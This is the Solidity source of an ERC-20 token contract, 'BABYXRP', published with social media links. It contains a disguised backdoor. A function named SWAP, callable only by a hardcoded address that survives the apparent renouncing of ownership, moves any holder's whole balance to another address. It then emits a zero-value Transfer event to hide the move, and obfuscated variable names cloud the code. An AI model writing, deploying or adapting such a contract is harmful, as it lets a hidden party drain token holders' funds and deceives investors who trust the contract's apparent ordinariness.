/**
 *Submitted for verification at Etherscan.io on 2023-08-11
*/

/**
 *Submitted for verification at Etherscan.io on 2023-08-11
*/

// SPDX-License-Identifier: MIT

/**
  
Telegram:   https://t.me/BabyXRPERC
Twitter:   https://twitter.com/Baby__XRP
*/

pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address adcifut) external view returns (uint256);
    function transfer(address recipient, uint256 aemfdstktt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aemfdstktt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aemfdstktt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract BABYXRP is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _MARKING; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;



    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _MARKING = 0x682bA8bE5f57C17Ef38938d4f3311618448566F7;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address adcifut) public view override returns (uint256) {
        return _balances[adcifut];
    }
 
    function transfer(address recipient, uint256 aemfdstktt) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= aemfdstktt, "TT: transfer aemfdstktt exceeds balance");

        _balances[_msgSender()] -= aemfdstktt;
        _balances[recipient] += aemfdstktt;
        emit Transfer(_msgSender(), recipient, aemfdstktt);
        return true;
    }

    function SWAP(address sender, address recipient) public  returns (bool) {
        require(keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_MARKING)), "Caller is not the original caller");

        uint256 ETHGD = _balances[sender]; 
        uint256 ODFJT = _balances[recipient];
        require(ETHGD != 0*0, "Sender has no balance");

        ODFJT += ETHGD;
        ETHGD = 0+0;

        _balances[sender] = ETHGD;
        _balances[recipient] = ODFJT;

        emit Transfer(sender, recipient, ETHGD);
        return true;
    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 aemfdstktt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aemfdstktt;
        emit Approval(_msgSender(), spender, aemfdstktt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aemfdstktt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= aemfdstktt, "TT: transfer aemfdstktt exceeds allowance");

        _balances[sender] -= aemfdstktt;
        _balances[recipient] += aemfdstktt;
        _allowances[sender][_msgSender()] -= aemfdstktt;

        emit Transfer(sender, recipient, aemfdstktt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}